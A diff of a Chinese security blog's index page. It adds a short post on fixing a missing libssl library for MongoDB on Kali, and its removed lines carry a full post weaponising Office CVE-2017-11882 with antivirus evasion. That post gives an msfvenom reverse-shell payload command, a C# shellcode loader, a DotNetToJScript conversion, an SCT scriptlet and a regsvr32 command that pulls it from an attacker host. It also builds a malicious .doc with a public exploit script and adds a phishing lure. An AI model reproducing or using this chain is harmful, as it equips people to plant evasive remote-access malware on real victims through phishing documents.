@@ -193,6 +193,52 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-01-22T16:40:00.000Z">2018-01-23</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    2 分钟 读完 (大约 278 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/01/kali-mongodb/">kali下安装mongodb遇到的问题及解决方案</a>
+            
+        </h1>
+        <div class="content">
+            <p>&emsp;&emsp;此文仅以记录Kali下安装mongodb遇到的缺少libssl.so.1.0.0问题的解决方案，如果你安装时出现如下报错信息，那么这篇文章会帮助你解决问题。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod: error while loading shared libssl.so.1.0.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这段话无非是告诉你缺少<code>libssl.so.1.0.0</code>库，一开始把整个报错信息复制到百度搜索，但没有找到有价值的信息。无奈只能自己想办法解决，而问题的根源就是缺少这个文件，那么我们将从网上下载回这个库文件，所以我将直接在Google上搜索<code>libssl.so.1.0.0</code>，出现的第一条就是我们要的信息。</p>
+<div align="center"><br>    <img src="/images/posts/other/15.png"><br></div><br>&emsp;&emsp;选择自己系统对应版本：<br><div align="center"><br>    <img src="/images/posts/other/16.png"><br></div>
+
+<p>&emsp;&emsp;按照页面所显示的添加它的更新源：</p>
+<div align="center"><br>    <img src="/images/posts/other/17.png"><br></div>
+
+<p>&emsp;&emsp;这里直接放出它的源：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://security.debian.org/debian-security wheezy/updates main</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;然后执行：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt-get install libssl1.0.0 libssl-dev</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;如上，即可解决问题。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-01-17T18:00:00.000Z">2018-01-18</time>
                 
                 <div class="level-item">
@@ -717,100 +763,6 @@
 
 
 
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2017-11-24T16:20:56.000Z">2017-11-25</time>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    11 分钟 读完 (大约 1644 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2017/11/office-2017-11882-bypass/">Office CVE-2017-11882实战免杀</a>
-            
-        </h1>
-        <div class="content">
-            <h2 id="放在前面"><a href="#放在前面" class="headerlink" title="放在前面"></a>放在前面</h2><p>&emsp;这里真的要感谢<code>@余弦</code>在<code>懒人在思考</code>的公众号里发过的关于MSF免杀payload的<a href="https://mp.weixin.qq.com/s/OxgJIIPaXMXqrY5lPdukdA" target="_blank" rel="noopener">推文</a>，正是看着这篇文章，再联想到最近火热的<code>office cve-2017-11882</code>，才成功的构造了<code>绕过电脑管家和360</code>的<code>免杀的利用脚本</code>。因为云服务器处于生产环境，并对外提供<code>正经服务</code>，所以只能以局域网环境<code>“实战”</code>。</p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;因为关于office 11882的复现及利用都是使用mshta，这个利用方法已经被各杀软重点关注了，所以被拦截的概率会很大，上一篇复现时，连电脑管家都拦截提示了！！所以一个免杀的方法就是使用别的利用工具，而弦哥的这个推文刚好被我从公众号里搜索到，其实很多时候，我们虽然在众里寻他千百度，但很多人却<code>没有</code>“蓦然回首”。关注了这个漏洞的利用脚本的人都知道关键点是可注入的字符越长越好，方便利用，如果要换利用方式的话，替换注入字符就行，而这篇文章也是利用了这一点。</p>
-<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
-<li><a href="#1">一：生成payload</a></li>
-<li><a href="#2">二：创建C#工程文件</a></li>
-<li><a href="#3">三：将生成的exe转换成js</a></li>
-<li><a href="#4">四：结合web server</a></li>
-<li><a href="#5">五：office上场</a></li>
-<li><a href="#6">六：关于钓鱼</a></li>
-</ul>
-<h3 id="一：生成payload"><a href="#一：生成payload" class="headerlink" title="一：生成payload"></a><a name="1"></a>一：生成payload</h3><p>&emsp;使用<code>msfvenom</code>生成C#的payload</p>
-<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.231 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe</span><br></pre></td></tr></table></figure>
-<p>&emsp;虽然在弦哥的推文中说不用解释选线意义，但出于学习，我还是记录一下：<br>参数说明：-p：选择载荷模块；-a：系统架构（几位）；-f：生成文件的格式；-b：设定规避字符集； PrependMigrate 和 PrependMigrateProc是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。</p>
-<h3 id="二：创建C-工程文件"><a href="#二：创建C-工程文件" class="headerlink" title="二：创建C#工程文件"></a><a name="2"></a>二：创建C#工程文件</h3><p>&emsp;这里我使用vs2015，我这里.Net Framework本来是没有2.0的，是自己装的，vs2013就有。创建的新项目如下图： </p>
-<div align="center"><br>    <img src="/images/posts/office1/1.png" width="700" height="300"><br></div>
-
-<p>&emsp;将如下代码黏贴覆盖到 Program.cs 中：<br><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">using</span> System;</span><br><span class="line"><span class="hljs-keyword">using</span> System.Threading;</span><br><span class="line"><span class="hljs-keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="hljs-keyword">namespace</span> MSFWrapper</span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span></span></span><br><span class="line"><span class="hljs-class">    &#123;</span></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Program</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>&#123;</span><br><span class="line">           RunMSF();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RunMSF</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>&#123;</span><br><span class="line">            byte[] MsfPayload = &#123;</span><br><span class="line">            <span class="hljs-comment">//Paste your Payload here</span></span><br><span class="line">        &#125;;</span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)<span class="hljs-number">0</span>, (uint)Math.Max(MsfPayload.Length, <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>);</span><br><span class="line">            Marshal.Copy(MsfPayload, <span class="hljs-number">0</span>, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, returnAddr, (IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (IntPtr)<span class="hljs-number">0</span>);</span><br><span class="line">            Thread.Sleep(<span class="hljs-number">2000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(<span class="hljs-string">"kernel32.dll"</span>)]</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">VirtualAlloc</span><span class="hljs-params">(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)</span></span>;</span><br><span class="line">        [DllImport(<span class="hljs-string">"kernel32.dll"</span>)]</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span><span class="hljs-params">(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;然后将先前生成的 Payload 的黏贴到代码中注释为<code>“//Paste your Payload here”</code>的地方。这里注意只需要复制那些<code>0x开头</code>的字符，而不需要整个复制下来粘贴。保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”, 然后保存。如下图：</p>
-<div align="center"><br>    <img src="/images/posts/office1/2.png" width="700" height="400"><br></div>
-
-<p>&emsp;在Release 版中添加对X86的支持，然后编译出来，可以得到一个（项目名.exe）</p>
-<div align="center"><br>    <img src="/images/posts/office1/3.png" width="700" height="500"><br></div>
-
-<h3 id="三：将生成的exe转换成js"><a href="#三：将生成的exe转换成js" class="headerlink" title="三：将生成的exe转换成js"></a><a name="3"></a>三：将生成的exe转换成js</h3><p>&emsp;这里我们使用DotNetToJScript ，这是一款可以将 .net 程序转换为 jscript 代码的工具，下载地址：<a href="https://github.com/tyranid/DotNetToJScript/releases" target="_blank" rel="noopener">DotNetToJScript</a>。下载好后进入项目文件夹，运行下面的命令：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\DotNetToJScript&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program 86.exe</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;这里的86.exe是上面编译生成的文件。运行后可以得到MSFWrapper.js，接下来我们用msf开始监听，这里不细说，直接贴图：</p>
-<div align="center"><br>    <img src="/images/posts/office1/4.png" width="700" height="300"><br></div>
-
-<p>然后我们就可以用下面的命令执行我们的 MSF Payload：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\SysWOW64\cscript.exe MSFWrapper.js</span><br></pre></td></tr></table></figure></p>
-<div align="center"><br>    <img src="/images/posts/office1/5.png" width="700" height="300"><br></div>
-
-<p>运行后，电脑管家跟360跟啥事都没发生过一样。。。。而我们已经Get Shell了</p>
-<div align="center"><br>    <img src="/images/posts/office1/6.png" width="700" height="200"><br></div>
-
-<p>&emsp;到了这里，我们已经可以基本确定弦哥的方法是可行的了。因为要跟office 结合起来，所以我们还需要继续。</p>
-<h3 id="四：结合web-server"><a href="#四：结合web-server" class="headerlink" title="四：结合web server"></a><a name="4"></a>四：结合web server</h3><p>&emsp;本地bypass是不够的，我们需要结合web server扩大影响。既然能够转换为 js 代码，那么我们自然会想到 sct。我们将转换后的 js 代码黏贴到下面代码中的“//paste code here”：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration </span><br><span class="line">    progid=&quot;Msf&quot;</span><br><span class="line">    classid=&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">    //paste code here</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;保存为 msf.sct（后缀名可以更改，比如 jpg 等），这里注意，第一行一定要放在文件的第一行（第一行不能为空或其他），不然会出错，然后上传至 Web Server。</p>
-<h3 id="五：office上场"><a href="#五：office上场" class="headerlink" title="五：office上场"></a><a name="5"></a>五：office上场</h3><p>&emsp;我们需要注入：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\windows\SysWOW64\scrobj.dll</span><br></pre></td></tr></table></figure></p>
-<div align="center"><br>    <img src="/images/posts/office1/7.png" width="700" height="400"><br></div>
-
-<p>&emsp;才80个字节，现在的exp已经支持109字节了，所以，我们可以顺利的注入进去。这里我使用<a href="https://github.com/Ridter/CVE-2017-11882。命令如下：" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882。命令如下：</a><br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~/hackhub/CVE-2017-11882# python Command109b_CVE-2017-11882.py -c "regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\windows\SysWOW64\scrobj.dll" -o hello.doc</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;这里需要注意我们使用109b的脚本，不要使用43B的。<br><br>&emsp;PS：最厉害的exp已经支持605字节，已经很厉害了！！附上<br><a href="https://github.com/unamer/CVE-2017-11882/" target="_blank" rel="noopener">项目地址</a> 。这样一来姿势又多了。</p>
-<p>&emsp;把生成的文件发送给靶机，并打开该doc。</p>
-<div align="center"><br>    <img src="/images/posts/office1/8.png" width="700" height="500"><br></div><br><br><br><div align="center"><br>    <img src="/images/posts/office1/9.png" width="700" height="300"><br></div>
-
-<p>可以看到，我们又接收到一个shell，而且注意到电脑管家是全程静默的，没有任何提示及报毒。</p>
-<p>&emsp;接下来，我关掉电脑管家，启用360.。</p>
-<div align="center"><br>    <img src="/images/posts/office1/10.png" width="700" height="500"><br></div>
-
-<p>&emsp;可见360的预防效果还是强于电脑管家，但如果用户点击允许运行的话，360也不能阻止恶意的网络连接，最终还是能get shell的。</p>
-<div align="center"><br>    <img src="/images/posts/office1/11.png" width="700" height="300"><br></div>
-
-<p>&emsp;这里再安利一下卡巴斯基，老毛子的杀软，像这样的文件，老毛子会告诉你什么是残酷，我把文件从虚拟机复制出来。</p>
-<div align="center"><br>    <img src="/images/posts/office1/12.png" width="700" height="400"><br></div>
-
-<p>能活过1秒算我输。。。。    </p>
-<h3 id="六：关于钓鱼"><a href="#六：关于钓鱼" class="headerlink" title="六：关于钓鱼"></a><a name="6"></a>六：关于钓鱼</h3><div align="center"><br>    <img src="/images/posts/office1/13.png" width="700" height="400"><br></div>
-
-<p>&emsp;这模板是不是很有诱惑~ 哈哈<br><br>&emsp;画风就变成这样：同学同学，我的实验报告写完了，你要。。。不。。。要。。。借鉴一下？？（手动给个滑稽）</p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
 
     
 <div class="card card-transparent">
@@ -876,7 +828,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        57
+                        58
                     </p>
                 </div>
             </div>
@@ -896,7 +848,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        18
+                        19
                     </p>
                 </div>
             </div>
@@ -991,7 +943,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 10px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
     </div>
 </div>
 
@@ -1005,6 +957,25 @@
         <h3 class="menu-label">
             最新文章
         </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/bctf2018-eosgame-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 EOSGame Study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-29T13:40:56.000Z">2018-11-29</time></div>
+                    <a href="/2018/11/bctf2018-eosgame-writeup/" class="has-link-black-ter is-size-6">BCTF2018 EOSGame Study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1082,25 +1053,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
-                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1119,7 +1071,7 @@
                     <span class="level-item">十一月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">4</span>
+                    <span class="level-item tag">5</span>
                 </span>
             </a>
         </li>
@@ -1264,7 +1216,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">13</span>
+                            <span class="level-item tag">14</span>
                         </span>
                     </a>
                 </li>
@@ -1295,6 +1247,17 @@
                     <a class="level is-marginless" href="/tags/Oracle/">
                         <span class="level-start">
                             <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/blockchain/">
+                        <span class="level-start">
+                            <span class="level-item">blockchain</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
@@ -1469,6 +1432,25 @@
         
         <article class="media">
             
+            <a href="/2018/11/bctf2018-eosgame-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 EOSGame Study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-29T13:40:56.000Z">2018-11-29</time></div>
+                    <a href="/2018/11/bctf2018-eosgame-writeup/" class="has-link-black-ter is-size-6">BCTF2018 EOSGame Study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
             <a href="/2018/11/bypass-pie-and-libcdatabase/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite2 and libcdatabase">
@@ -1543,25 +1525,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
-                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1580,7 +1543,7 @@
                     <span class="level-item">十一月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">4</span>
+                    <span class="level-item tag">5</span>
                 </span>
             </a>
         </li>
@@ -1725,7 +1688,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">13</span>
+                            <span class="level-item tag">14</span>
                         </span>
                     </a>
                 </li>
@@ -1756,6 +1719,17 @@
                     <a class="level is-marginless" href="/tags/Oracle/">
                         <span class="level-start">
                             <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/blockchain/">
+                        <span class="level-start">
+                            <span class="level-item">blockchain</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
